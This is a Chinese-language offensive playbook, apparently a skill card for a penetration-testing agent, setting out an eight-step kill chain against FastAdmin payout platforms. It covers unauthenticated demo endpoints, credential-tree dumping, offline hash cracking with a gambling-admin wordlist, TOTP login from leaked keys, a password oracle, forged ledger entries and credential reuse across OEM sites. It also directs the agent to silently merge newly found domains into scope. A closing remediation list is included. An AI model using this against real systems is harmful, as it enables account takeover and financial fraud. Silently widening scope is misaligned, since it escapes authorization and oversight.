> Skill：`杀招/快府·代付`  
> 探针：`炼蛊房/fastadmin_daifu_probe.py`  
> 对象矩阵：`万我.md`  
> 对照（勿混）：彩虹易支付 → `epay-admin-pentest`；纯 ThinkPHP 面 → `幻页·认族.md`；Shop 多租户 `/shop_hq` → `快府·横夺.md`

---

## 0. 一句话

FastAdmin 代付台的主链不是 RCE，而是 **未授权 demo → 公网 JS → 任意身份 → `part/index` 拖整树凭据 → 离线破解 / TOTP → 对象矩阵找真结算口**。  
大量「已确认漏洞」叠在一起，只要缺 **真结算写口** 或 **上级 google_key**，就还是 L2，不是接管。

## 1. 适用指纹

| 层 | 信号 |
|----|------|
| 框架 | ThinkPHP + FastAdmin；`/assets/js/backend/` 公网 200；`composer.json` 可读 |
| 入口 | `/sh.php` 总后台 · `/ks.php` 卡商/代理 · 偶见 `/df.php` / 自定义短入口 |
| 登录 | 字段 `username password captcha code keeplogin __token__`；码 `/index.php?s=/captcha` |
| 哈希 | `md5(md5(password)+salt)`（FastAdmin 默认） |
| 2FA | 字段 `code` = TOTP；`is_google=normal` 时常 **先 TOTP 后密码** |
| 签 | `md5(ksort(k=v&…)+"&key="+apikey).upper()`；时间戳字段常见 `paydate` |
| 业务 | 代付/下发/卡商；通道码 8801 支转卡 / 8802 支转支；ShowDoc 文档站 |

命中「支付管理中心」+ `admin_login.lock` → **立刻换** `epay-admin-pentest`，不要套本卡。

## 2. 证明分级（禁止跳级）

| 级别 | 含义 | 本家族例子 |
|------|------|------------|
| observed | 指纹/入口在 | `/sh.php` 登录页、backend JS 200 |
| primitive | 未授权原语 | `/api/demo/getChannels` 出余额 |
| local_proof | 登录后敏感字段 | `part/index` 含 hash+salt+google_key |
| remote_proof | 可复现控制 | 明文登录成功；或 **B 票**看到结算余额变化 |
| takeover | 超管/出款可控 | 总后台会话或通道出款；**改原超管密默认禁止** |

```text
demo 能拉余额 ≠ 能出款
part/multi 写 money ≠ 结算余额
makemoney 流水增加 ≠ 真加款
hash 泄露 ≠ 已登录（还要 salt 破解 + 可能 2FA）
子号关掉自己的 is_google ≠ 能关上级 2FA
```

## 3. 八步杀伤链

### ① 指纹与入口

```bash
python3 炼蛊房/fastadmin_daifu_probe.py recon \
  --base https://授权站 --case <案卷> --insecure
```

并行记：`/sh.php` `/ks.php` `/assets/js/backend/` `/composer.json` `/api/demo/` ShowDoc。  
CF 对部分 `/api/*` 回 444/429 是常见挡法，**换入口再测**，不要当「没有 demo」。

### ② 未授权 `/api/demo/*`（L1）

开发期 demo 控制器上线忘删，且常无鉴权中间件。最少打：

| 路径 | 看什么 |
|------|--------|
| `/api/demo/getChannels` | 通道与余额 |
| `/api/demo/getmoney/id/{id}` | 指定通道余额 |
| `/api/demo/getChannelGroup` | 通道编码表 |
| `/api/demo/getuserpartmch` | 代理名单 |
| `/api/demo/getKs` / `getuserpart` | 卡商树 |
| `/api/demo/getpc/banknumber/{n}` | 卡查询面 |
| `/api/demo/backOrder` / `selfBack` | **动作面**（selfBack 常直接 success） |

动作面只做最小只读/可回滚验证；真退单/出款先问。

### ③ 公网 backend JS（L1）

不登录下载 `/assets/js/backend/*.js`，正则抽 `url:"…"` / `controller/action`。  
这是后续 `part` / `makemoney` / 结算口的 **路由真源**，比猜路径快。

### ④ 任意身份进门

优先级：

1. 已知弱口 + OCR 过 captcha（`captcha-ocr`）  
2. 开放「添加下级」→ 自建子号登录  
3. 跨站同密（OEM 多套 `/sh.php` 共用弱口）  
4. 文档站 / ShowDoc 里的 mchid+apikey（先验证是否绑定）

登录字段必须带 `__token__`（页里拿）+ captcha。  
`is_google=normal`：**先填 TOTP `code`，再填密码**，顺序反了会误判「密码错」。

### ⑤ `part/index` 拖树（L2）

任意卡商/代理进门后：

```text
GET /{portal}.php/part/index?offset=0&limit=50
```

若回包含 `password` + `salt` + `google_key` + `apikey` + `token` → **整棵下级树凭据原料已到手**。  
落盘到 `案卷/fastadmin_daifu/part_rows.json`；STATUS 只写条数与角色，不写完整 TOTP/apikey。

### ⑥ 离线破解 + 2FA oracle（L2b）

```text
hash == md5( md5(plaintext) + salt )
```

```bash
python3 炼蛊房/fastadmin_daifu_probe.py crack \
  --hash-file 案卷/<案卷>/案卷/fastadmin_daifu/part_rows.json \
  --wordlist dict/gambling_admin_passwords.txt
```

代理树常见 **大批同明文**。破开后用各自 `google_key` 算 TOTP 登录。

**密码 oracle**（校验顺序漏洞）：

| 输入 | 典型回显 |
|------|----------|
| 错密码 + 任意 TOTP | 「账号或密码错误」 |
| 对密码 + 空/错 TOTP | 「谷歌验证已开启…」 |

可在无 TOTP 时确认密码是否正确。上级号的 `google_key` **经常不在下级 dump 里**——这是硬缺环，换格子。

### ⑦ 对象矩阵（有身份必填）

| | 读 | 写 | 加款 | 配置 |
|--|----|----|------|------|
| 自己 | dashboard / 自己流水 | 改自己资料 | 真结算口（不是 multi money） | 自己 apikey / 2FA |
| 他人 | `part/index` 下级敏感字段 | `part/multi` 改他人 money/score/`is_google` | 伪造 `admin_id` 的 makemoney；通道出款 | 关他人 2FA / 开 `api_open` |

`part/multi` 可落库且 `part/index` 回读一致，但子号 dashboard **常常不展示** 该 money → **journal / 展示字段，不是结算余额**。  
`makemoney/add` 可伪造 `admin_id`：流水增加、mlog/真余额不变 → 审计污染。

加款格闭合标准：注册/持有 B → 用写口给 B 加最小额 → **B 的票**查结算余额差。大额 / 真出款先问。

### ⑧ 真结算 / 超管（L3–L4）

还没找到真结算写口时，不准结案。继续：

- JS 里 `wallet` / `settle` / `balance` / `recharge` / `addmoney` 真 POST  
- 通道 API：用泄露 apikey + `paydate` 签下单（IP 白名单常挡）  
- 映射历史真加款操作者 `admin_id` → 用户名 → 要该号 `google_key` 或更高会话  
- 同源 OEM 站横向（同哈希、同弱口、不同库）

默认禁止：改原超管密码、耗通道真余额、清数据。

## 4. 缺环表（有洞打不出「大漏洞」时看这里）

| 已有 | 缺 | 下一刀 | 不要做 |
|------|----|--------|--------|
| demo 读余额 | 出款/退单鉴权 | 测 `selfBack` 是否真改单 | 把读当成 RCE |
| backend JS | 登录身份 | 弱口 / 自建下级 | 只存 JS 结案 |
| part 泄 hash | 明文或 TOTP | `crack` + oracle | 在线爆破锁号 |
| 子号会话 | 上级 `google_key` | 换他人格 / 跨站 / 文档钥 | 穷举 TOTP |
| multi money 落库 | 结算余额 | 找真加款 POST | 写「已加款」 |
| makemoney 流水 | mlog/余额 | 映射真操作者 | 再刷流水 |
| apikey | 白名单 IP / 商户类型 | 源站直连或换 mchid | 当假支付已成 |

这就是「很多漏洞却没有 RCE」的常态：本家族 **主价值在凭据树 + 资金格**，RCE 是旁路（`.env` / 上传 / 已知 TP 链），走 `幻页·认族.md`，不要把代付专卡写成 GetShell。

## 5. 跨站横向

OEM 代付常一套源码多域名。判定：

- 同一 FastAdmin 哈希算法  
- `part/index` 字段集相同  
- 弱口令批次相同  

则：本站破开的明文 + TOTP → 对已授权同源站 `/sh.php` 试登录。用户名无效是正常（库不同）。  
主站链上发现的 OEM 域 → `scope_expand` 静默并入。

## 6. 修复建议（给报告用）

1. 下线或鉴权全部 `/api/demo/*`  
2. `part/index` 禁止回 hash/salt/google_key/apikey/token  
3. `part/multi` 禁止写 money/score/is_google/api_open  
4. `makemoney` 禁止客户端指定 `admin_id`；流水与结算强一致  
5. 登录错误信息统一；TOTP 密钥只存服务端、不随列表出  
6. backend JS / composer 勿公网直出  
7. 支付 API 维持 IP 白名单；轮换已泄露 apikey/弱口
